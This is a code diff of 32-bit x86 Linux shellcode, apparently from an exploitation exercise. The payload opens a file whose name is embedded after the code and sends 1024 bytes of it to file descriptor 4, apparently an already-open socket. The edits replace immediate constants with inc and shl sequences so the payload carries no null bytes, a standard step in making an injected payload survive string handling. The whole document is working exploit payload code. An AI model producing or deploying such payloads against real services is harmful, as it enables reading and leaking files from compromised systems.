@@ -1,15 +1,20 @@
 BITS 32
 GLOBAL _start
 _start:
-    jmp get_eip
+    jmp short get_eip
  
 run:
     xor eax, eax
-    xor edi, edi
+    inc eax
+    inc eax
+    inc eax
+    inc eax
+    mov edi, eax
     xor edx, edx
  
     ; fd = sys_open(filename, 0, 0)
-    mov eax, 5    ; sys_open
+    mov eax, edi
+    inc eax       ; sys_open
     pop ebx       ; filename
     xor ecx, ecx  ; flags = 0
     xor edx, edx  ; mode = 0
@@ -19,9 +24,10 @@ run:
     mov ecx, eax  ; in_fd
     xor eax, eax 
     mov al, 0xbb  ; sendfile() syscall
-    mov ebx, 4    ; out_fd
+    mov ebx, edi  ; out_fd
     xor edx, edx  ; offset = 0
-    mov esi, 1024 ; size
+    mov esi, edi
+    shl esi, 8    ; size (4 << 8 = 1024)
     int 0x80
 
     ; sys_exit(0)
